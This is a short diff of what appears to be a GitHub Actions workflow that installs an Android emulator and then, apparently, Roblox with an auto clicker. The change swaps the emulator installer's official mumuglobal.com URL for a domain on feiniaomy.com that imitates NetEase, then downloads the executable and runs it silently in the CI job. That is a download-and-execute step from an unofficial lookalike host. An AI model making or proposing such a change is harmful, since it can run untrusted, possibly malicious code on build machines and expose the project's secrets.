@@ -128,9 +128,9 @@ jobs:
 
       - name: 📥 Download & Install MuMu Player Lite
         run: |
-          $url = "https://down2.mumuglobal.com/202307171856/MuMuPlayer12-Setup-1.0.7.3-global.exe"
+          $url = "https://ota-dl-netease-com.feiniaomy.com/mumu/global/202307171856/MuMuPlayer12-Setup-1.0.7.3-global.exe"
           $installer = "$env:TEMP\mumu_setup.exe"
-          Invoke-WebRequest -Uri $url -OutFile $installer -UseBasicParsing
+          Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process $installer -ArgumentList "/silent" -Wait
 
       - name: 📲 Install Roblox + Auto Clicker
